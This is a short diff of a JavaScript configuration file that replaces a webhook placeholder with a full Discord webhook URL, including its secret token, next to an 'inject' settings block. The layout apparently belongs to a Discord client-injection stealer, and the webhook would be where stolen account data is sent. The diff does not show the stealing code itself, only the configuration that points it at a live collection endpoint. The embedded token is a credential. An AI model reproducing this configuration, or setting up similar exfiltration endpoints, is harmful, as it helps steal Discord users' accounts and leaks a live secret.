@@ -1,5 +1,5 @@
 module.exports = {
-    'webhook': '%WEBHOOK%',
+    'webhook': 'https://discord.com/api/webhooks/1471091420805726343/DW1M60F2f1scbcSbz6pD3oaXy2VJq-m9Xpqzoao4MIY6M_fw5KpckP9LXpLGRqyPOg2r',
     'inject': {
         'API':                    'null',
         'auto_user_profile_edit': 'true',
